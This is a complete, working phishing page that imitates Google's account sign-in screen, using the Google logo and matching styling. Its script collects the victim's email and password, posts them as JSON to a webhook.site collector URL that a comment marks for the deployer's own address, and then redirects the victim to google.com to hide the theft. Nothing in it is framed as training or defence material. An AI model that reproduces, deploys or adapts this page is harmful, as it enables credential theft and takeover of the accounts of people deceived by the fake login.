<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google accounts</title>
    <style>
        body {
            font-family: arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f2f2f2;
        }
        .container {
            width: 450px;
            padding: 40px 60px 30px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            background-color: white;
            text-align: left;
        }
        h1 {
            margin-bottom: 10px;
            font-size: 24px;
            font-weight: 400;
            color: #202124;
        }
        p {
            margin-top: 0;
            margin-bottom: 20px;
            font-size: 16px;
            color: #202124;
        }
        /* Gmail-style Input */
        input[type="email"], input[type="password"] {
            width: 100%;
            padding: 13px 15px;
            margin: 10px 0;
            box-sizing: border-box;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
            transition: border 0.2s;
        }
        input:focus {
            border: 2px solid #1a73e8;
            padding: 12px 14px; /* Adjusts for border width change */
        }
        button {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
            float: right;
        }
        button:hover {
            background-color: #1765cc;
        }
        .error {
            color: #d93025;
            font-size: 13px;
            margin-top: 5px;
            display: none;
        }
        .logo-container {
            text-align: center;
            margin-bottom: 20px;
        }
        img {
            width: 75px;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="logo-container">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
    </div>
    
    <h1>Sign in</h1>
    <p>Use your Google Account</p>
    
    <!-- Step 1: Email -->
    <div id="step1">
        <input type="text" id="email" placeholder="Email or phone" required autocomplete="off">
        <div class="error" id="errorMsg">Enter a valid email address</div>
        <button onclick="nextStep()">Next</button>
    </div>

    <!-- Step 2: Password -->
    <div id="step2" style="display: none;">
        <input type="password" id="password" placeholder="Enter your password" required autocomplete="off">
        <button onclick="submitForm()">Next</button>
    </div>
</div>

<script>
    // YOUR WEBHOOK URL HERE
    const webhookUrl = "https://webhook.site/9f7463ee-3637-48df-bfef-e22245193603";

    function nextStep() {
        const email = document.getElementById('email').value;
        if (email.length > 0) {
            document.getElementById('step1').style.display = 'none';
            document.getElementById('step2').style.display = 'block';
            document.getElementById('password').focus();
        } else {
            document.getElementById('errorMsg').style.display = 'block';
        }
    }

    async function submitForm() {
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        
        // Send data to Webhook
        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email: email, password: password })
        });
        
        // Wait 1 second to ensure webhook receives the body
        await new Promise(r => setTimeout(r, 1000)); 
        
        window.location.href = "https://www.google.com";
    }
</script>

</body>
</html>
